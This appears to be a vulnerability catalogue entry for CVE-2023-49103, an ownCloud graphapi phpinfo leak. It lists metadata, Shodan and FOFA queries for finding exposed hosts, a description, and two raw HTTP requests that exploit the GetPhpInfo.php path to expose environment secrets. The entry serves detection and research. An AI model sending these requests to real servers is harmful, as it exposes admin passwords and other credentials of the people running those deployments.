---
layout: "post"
cve_id: "CVE-2023-49103"
title: "OwnCloud - Phpinfo Configuration"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-49103.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-49103.yaml"
author: "ritikchaddha"
severity: "high"
reference:
  - "https://github.com/creacitysec/CVE-2023-49103/blob/main/exploit.py"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-49103"
  - "https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/"
  - "https://www.labs.greynoise.io//grimoire/2023-11-29-owncloud-redux/"
  - "https://attackerkb.com/topics/G9urDj4Cg2/cve-2023-49103"
  - "https://www.rapid7.com/blog/post/2023/12/01/etr-cve-2023-49103-critical-information-disclosure-in-owncloud-graph-api/"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
  cvss-score: 7.5
  cve-id: "CVE-2023-49103"
  cwe-id: "CWE-200"
  epss-score: 0.94329
  epss-percentile: 0.99946
  cpe: "cpe:2.3:a:owncloud:graph_api:0.2.0:*:*:*:*:*:*:*"
metadata:
  verified: True
  max-request: 2
  vendor: "owncloud"
  product: "graph_api"
  shodan-query: ['title:"owncloud"', 'http.title:"owncloud"']
  fofa-query: "title=\"owncloud\""
  google-query: "intitle:\"owncloud\""
tags:
  - "cve2023"
  - "cve"
  - "owncloud"
  - "phpinfo"
  - "config"
  - "kev"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
An issue was discovered in ownCloud owncloud/graphapi 0.2.x before 0.2.1 and 0.3.x before 0.3.1. The graphapi app relies on a third-party GetPhpInfo.php library that provides a URL. When this URL is accessed, it reveals the configuration details of the PHP environment (phpinfo). This information includes all the environment variables of the webserver. In containerized deployments, these environment variables may include sensitive data such as the ownCloud admin password, mail server credentials, and license key. Simply disabling the graphapi app does not eliminate the vulnerability. Additionally, phpinfo exposes various other potentially sensitive configuration details that could be exploited by an attacker to gather information about the system.


## üåê HTTP Request
```nohighlight
GET /apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/LSYe.css HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/hTIH.css HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.3
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```


